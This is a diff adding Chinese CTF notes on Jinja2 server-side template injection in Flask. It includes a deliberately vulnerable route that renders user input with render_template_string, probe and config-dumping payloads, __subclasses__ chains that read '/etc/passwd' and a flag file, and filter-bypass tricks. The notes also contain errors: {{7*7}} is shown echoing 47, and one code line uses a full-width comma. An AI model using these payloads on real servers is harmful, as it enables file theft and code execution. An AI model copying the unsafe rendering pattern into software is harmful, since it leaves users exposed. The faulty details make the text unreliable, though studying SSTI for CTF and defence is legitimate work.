@@ -1,0 +1,111 @@
+jinjia2是python的flask框架使用的模板引擎
+
+服务端控制层代码：
+```
+from flask import *
+
+app = Flask(__name__)
+app.config['JSON_AS_ASCII'] = False
+
+@app.route('/', methods=['post', 'get'])
+def index():
+    return render_template('index.html')
+
+@app.route('/login', methods=['post', 'get'])
+def login():
+    name = request.args.get('name', '默认字')
+    # 对应的，当html是一个文件时，使用render_template 函数来渲染一个指定的文件
+    return render_template('login.html'，name=name)
+    # login.html使用{{name}}显示默认字
+
+@app.route("/test", methods=['post', 'get'])
+def test():
+    # 接受参数名为name的参数传入
+    name = request.args.get('name', '默认字')
+    # 设置一个模板html，将name的值以%s输出
+    html = '''<h3>your input %s</h3>'''%name
+    # 将html以字符串模板的形式渲染
+    return render_template_string(html)
+
+if __name__ == '__main__':
+    app.run(debug=True)
+```
+函数render_template_string()在渲染前端页面时没有考虑输入的参数，导致注入。
+jinjia2模板渲染:
+```
+{{ ... }}：装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。
+{% ... %}：装载一个控制语句。
+{# ... #}：装载一个注释，模板渲染的时候会忽视这中间的值
+
+1. 测试：
+/test?name={{7*7}}
+回显：
+your input 47
+
+2. 测试：
+/test?name={{7*'7'}}
+回显：
+your input 77777777
+```
+
+
+^
+## **模板中可以使用的属性**
+```
+返回信息
+{{self.__dict__}}
+{{config}}
+
+
+使用内置函数查看全局变量字典
+{{url_for.__globals__}}
+若里面有current_app，查看当前APP配置，里面可能有flag变量值。
+{{url_for.__globals__['current_app'].config}}
+也可
+{{get_flashed_messages.__globals__['current_app'].config}}
+
+
+__class__ 返回类型所属的对象。
+__mro__返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析，这里也就是class返回的对象所属的类。
+__base__返回该对象所继承的基类，这里也就是class返回的对象所属的类。
+__subclasses__返回基类中的所有子类，每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表。
+
+__globals__对包含函数全局变量的字典的引用，
+里面包括get_flashed_messages()返回在Flask中通过 flash() 传入的闪现信息列表。
+把字符串对象表示的消息加入到一个消息队列中，
+然后通过调用get_flashed_messages() 方法取出
+(闪现信息只能取出一次，取出后闪现信息会被清空)。
+
+1. 测试：
+/test?name={{''.__class__}}
+回显：
+ your input <class 'str'>
+
+2. 测试：
+/test?name={{''.__class__.__base__}}
+回显:
+your input <class 'object'>
+
+3. 测试:
+/test?name={{''.__class__.__base__.__subclasses__()}}
+回显:
+your input object基类的子类
+```
+注入操作：
+大多数题目的flag均藏在系统中的某个文件内
+```
+{{[].__class__.__base__.__subclasses__()[122]('E:/flag.php').read()}}
+
+{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+```
+绕过
+```
+* `request.__class__`
+* `request["__class__"]`
+* `request|attr("__class__")`
+* `array[0]`
+* `array.pop(0)`
+```
+SSTI绕过注入:<https://xz.aliyun.com/t/3679#toc-11>
+ctf详解:<https://www.cnblogs.com/Article-kelp/p/14797393.html#questionOne>
+python解题模板:<https://blog.csdn.net/qq_51096893/article/details/122020518>
